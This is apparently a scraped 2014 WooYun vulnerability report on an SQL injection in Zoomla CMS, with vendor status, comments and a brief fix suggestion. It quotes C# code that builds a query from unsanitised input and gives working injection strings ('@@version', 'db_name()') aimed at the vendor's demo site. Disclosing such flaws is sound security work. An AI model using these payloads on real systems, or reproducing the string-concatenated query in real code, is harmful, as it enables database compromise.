{"id": 52458, "wybug_id": "wooyun-2014-071161", "wybug_title": "逐浪CMS某处SQL注入一枚", "wybug_corp": "逐浪CMS", "wybug_author": "路人甲", "wybug_date": "2014-08-06 15:46", "wybug_open_date": "2014-11-01 15:48", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-11：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-01：\t细节向公众公开  简要描述： 逐浪最新版 注入一枚  详细说明：  最新版默认是可以注册用户的\nhttp://demo.zoomla.cn/User/login.aspx\n注册用户 我这里用的是\ntest123\n\n111111\n登录然后访问\ndemo.zoomla.cn/User/UserZone/AddStructure.aspx\n主要代码是\nprotected void Button1_Click(object sender, EventArgs e){    if (base.Request.QueryString[\"ID\"] != null)    {        int iD = DataConverter.CLng(base.Request.QueryString[\"ID\"]);        this.model = this.bll.Select(iD);        this.model.Name = base.Request.Form[\"Name\"];        this.bll.Update(this.model);        function.JsAlert(\"修改成功！\", \"Structure.aspx\");    }    else if ((this.TxtProjectName.Text.Trim() != null) && (this.TxtProjectName.Text.Trim() != \"\")) //看这里    {        if (this.bll.Sel(\"Name='\" + this.TxtProjectName.Text.Trim() + \"'\", \"\").Rows.Count > 0) 输入框没处理 存在注入        {            this.LblMessage.Text = \"<font color=red>此结构名已存在，请重新输入！</font>\";        }        else        {            this.model.ParentID = 0;            if (base.Request.QueryString[\"pid\"] != null)            {                this.model.ParentID = DataConverter.CLng(base.Request.QueryString[\"pid\"]);            }            this.model.Opens = 1;            this.model.Status = 0x63;            if (!string.IsNullOrEmpty(base.Request[\"Group\"]))            {                this.model.Group = DataConverter.CLng(base.Request.QueryString[\"Group\"]);            }            else            {                this.model.Group = 1;            }            this.model.Name = this.TxtProjectName.Text.Trim();            this.model.AddTime = DateTime.Now;            this.model.UserID = this.buser.GetLogin().UserID;            int num2 = this.bll.Insert(this.model);            if (num2 > 0)            {                M_UserInfo userInfo = this.buser.SeachByID(this.buser.GetLogin().UserID);                userInfo.StructureID = userInfo.StructureID + num2;                this.buser.UpDateUser(userInfo);                base.Response.Write(\"<script>alert('添加成功！！！');location.href='Structure.aspx';</script>\");            }            this.LblMessage.Text = \"\";        }    }    else    {        this.LblMessage.Text = \"<font color=red>请输入项目类型名称</font>\";    }}\n访问\ndemo.zoomla.cn/User/UserZone/AddStructure.aspx\n输入框输入\n1' and (select @@version)>0--\n点击提交\n\n\n\n输入框输入的\n1' and (select db_name() )>0--\n\n\n   漏洞证明：  \n\n   修复方案：  对输入框进行处理   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-11-01 15:48 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-06 15:50 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  逐浪  逐浪。。。。真是烂的一逼。。。。天天就是注入。。。你的客户还不得被你射死啊    \n     2014-08-06 15:50 |    \t\thcyoo \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 自从得了精神病，感觉整个人都精神多了。)\t\t \n  @狗狗侠 给力，客户和公司之间对射    \n     2014-08-06 23:45 |    \t\tVigoss_Z \t\t\t( 普通白帽子  |\t\t\t        Rank:404 漏洞数:63        | 楞娃)\t\t \n  @狗狗侠 功能太多了,什么都往里面加,网页在线聊天都有......同一功能有的过滤了,有的地方能注,估计不同的人写的.    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}